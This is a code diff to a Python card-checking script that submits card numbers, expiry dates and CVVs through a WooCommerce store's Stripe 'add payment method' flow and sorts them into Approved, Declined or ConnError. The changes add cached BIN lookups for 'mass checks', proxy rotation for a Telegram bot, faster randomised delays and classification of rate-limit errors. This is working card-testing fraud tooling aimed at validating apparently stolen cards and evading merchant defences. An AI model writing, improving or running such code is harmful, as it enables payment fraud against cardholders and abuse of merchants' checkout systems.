@@ -10,6 +10,7 @@ import random
 import uuid
 import requests
 import logging
+import threading
 
 try:
     import cloudscraper
@@ -91,42 +92,83 @@ ULTRA_HEADERS = {
     'sec-ch-ua-platform': '"Android"',
 }
 
+# ============================================================
+#  BIN cache — avoids hammering BIN APIs on mass checks
+# ============================================================
+_bin_cache = {}
+_bin_cache_lock = threading.Lock()
+
 
 def _get_bin_info(bin6):
-    """Multi-API BIN lookup."""
-    bin6 = bin6.replace(" ", "")[:8]
+    """Multi-API BIN lookup with in-memory cache."""
+    bin6 = bin6.replace(" ", "")[:6]
+
+    with _bin_cache_lock:
+        if bin6 in _bin_cache:
+            return _bin_cache[bin6]
+
     apis = [
-        f"https://api.voidex.dev/api/bin?bin={bin6[:6]}",
-        f"https://binsapi.vercel.app/api/bin/{bin6[:6]}",
-        f"https://lookup.binlist.net/{bin6[:6]}",
+        (f"https://api.voidex.dev/api/bin?bin={bin6}", "voidex"),
+        (f"https://binsapi.vercel.app/api/bin/{bin6}", "binsapi"),
+        (f"https://bins.antipublic.cc/bins/{bin6}", "antipublic"),
+        (f"https://lookup.binlist.net/{bin6}", "binlist"),
     ]
-    for api in apis:
+
+    for api_url, src in apis:
         try:
-            r = requests.get(api, timeout=4)
-            if r.status_code == 200:
-                data = r.json()
-                brand = (data.get('scheme') or data.get('brand') or data.get('Brand') or 'N/A').upper()
-                bank = (data.get('bank', {}).get('name') if isinstance(data.get('bank'), dict) else data.get('bank') or data.get('Bank') or 'N/A')
-                if isinstance(bank, str):
-                    bank = bank.upper()
-                else:
-                    bank = 'N/A'
-                country = (data.get('country', {}).get('name') if isinstance(data.get('country'), dict) else data.get('country') or data.get('Country') or 'N/A')
-                if isinstance(country, str):
-                    country = country.upper()
-                else:
-                    country = 'N/A'
-                emoji = (data.get('country', {}).get('emoji') if isinstance(data.get('country'), dict) else data.get('emoji') or '')
-                if not emoji:
-                    emoji = ''
-                if brand != 'N/A' or bank != 'N/A':
-                    return {
-                        "brand": brand, "bank": bank,
-                        "country": country, "emoji": emoji,
-                    }
+            headers = {"Accept": "application/json"}
+            if src == "binlist":
+                headers["Accept-Version"] = "3"
+            r = requests.get(api_url, timeout=6, headers=headers)
+            if r.status_code != 200:
+                continue
+            data = r.json()
+
+            # Normalize across different API shapes
+            brand = (
+                data.get('scheme') or data.get('brand') or
+                data.get('Brand') or data.get('cardBrand') or 'N/A'
+            )
+            if isinstance(brand, str):
+                brand = brand.upper()
+            else:
+                brand = 'N/A'
+
+            bank_raw = data.get('bank')
+            if isinstance(bank_raw, dict):
+                bank = bank_raw.get('name', 'N/A')
+            elif isinstance(bank_raw, str):
+                bank = bank_raw
+            else:
+                bank = data.get('Bank') or data.get('issuer') or 'N/A'
+            bank = bank.upper() if isinstance(bank, str) else 'N/A'
+
+            country_raw = data.get('country')
+            if isinstance(country_raw, dict):
+                country = country_raw.get('name', 'N/A')
+                emoji = country_raw.get('emoji', '')
+            elif isinstance(country_raw, str):
+                country = country_raw
+                emoji = data.get('emoji', '')
+            else:
+                country = data.get('Country') or 'N/A'
+                emoji = data.get('emoji', '')
+            country = country.upper() if isinstance(country, str) else 'N/A'
+            if not emoji:
+                emoji = ''
+
+            if brand != 'N/A' or bank != 'N/A':
+                result = {"brand": brand, "bank": bank, "country": country, "emoji": emoji}
+                with _bin_cache_lock:
+                    _bin_cache[bin6] = result
+                return result
         except Exception:
             continue
-    return {"brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": ""}
+
+    fallback = {"brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": ""}
+    with _bin_cache_lock:
+        _bin_cache[bin6] = fallback
+    return fallback
 
 
 def _process_card(cc, mm, yy, cvv, proxy_dict=None):
@@ -142,14 +184,24 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
         else:
             scraper = requests.Session()
 
+        # Proxy only for site requests, NOT for Stripe API
         if proxy_dict:
-            scraper.proxies.update(proxy_dict) if hasattr(scraper, 'proxies') else None
+            scraper.proxies.update(proxy_dict)
 
         scraper.cookies.update(acc['cookies'])
         scraper.headers.update(ULTRA_HEADERS)
 
         # Step 1: Load add-payment-method page
-        r_page = scraper.get(APM_URL, timeout=25)
+        try:
+            r_page = scraper.get(APM_URL, timeout=20)
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
+                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
+            return {"status": "ConnError", "response": str(e)[:80]}
+
+        if r_page.status_code == 429:
+            return {"status": "ConnError", "response": "Rate limited (429)"}
+        if r_page.status_code == 503:
+            return {"status": "ConnError", "response": "Service unavailable (503)"}
         if r_page.status_code != 200:
             return {"status": "Error", "response": f"Site HTTP {r_page.status_code}"}
 
@@ -163,9 +215,10 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
             return {"status": "Error", "response": "Setup nonce not found"}
         addnonce = nonce_match.group(1)
 
-        time.sleep(random.uniform(0.5, 1.2))
+        time.sleep(random.uniform(0.3, 0.8))
 
-        # Step 2: Create payment method on Stripe
+        # Step 2: Create payment method on Stripe (DIRECT — no proxy needed)
+        stripe_session = requests.Session()
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -188,10 +241,14 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
             f'&time_on_page={random.randint(90000, 150000)}'
         )
 
-        r_stripe = scraper.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=stripe_headers, data=stripe_payload, timeout=15
-        )
+        try:
+            r_stripe = stripe_session.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=stripe_headers, data=stripe_payload, timeout=12
+            )
+        except Exception as e:
+            return {"status": "ConnError", "response": f"Stripe API: {str(e)[:60]}"}
+
         stripe_json = r_stripe.json()
 
         if 'id' not in stripe_json:
@@ -207,7 +264,13 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': addnonce,
         }
-        r_ajax = scraper.post(AJAX_URL, data=ajax_data, timeout=20)
+
+        try:
+            r_ajax = scraper.post(AJAX_URL, data=ajax_data, timeout=20)
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
+                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
+            return {"status": "ConnError", "response": str(e)[:80]}
+
         ajax_text = r_ajax.text.lower()
 
         if '"success":true' in ajax_text or 'insufficient_funds' in ajax_text:
@@ -222,7 +285,14 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
         return {"status": "Declined", "response": (reason.group(1) if reason else "Rejected")[:120]}
 
     except Exception as e:
-        return {"status": "Error", "response": str(e)[:80]}
+        err_str = str(e)[:80]
+        # Classify connection-type errors
+        conn_keywords = ["Max retries", "ConnectionPool", "ConnectionError",
+                         "Timeout", "Connection refused", "Connection reset",
+                         "SSLError", "RemoteDisconnected"]
+        if any(k in err_str for k in conn_keywords):
+            return {"status": "ConnError", "response": err_str}
+        return {"status": "Error", "response": err_str}
 
 
 def check_card(cc_line, proxy_dict=None):
@@ -238,6 +308,12 @@ def check_card(cc_line, proxy_dict=None):
 
     status = result.get("status", "Error")
     response = result.get("response", "Unknown")
+
+    # Connection errors — return special marker for tg_bot to retry with different proxy
+    if status == "ConnError":
+        return f"ConnError | {response}"
+
+    # Only look up BIN for real results (not errors)
     bin_info = _get_bin_info(cc[:6])
 
     if status == "Approved":
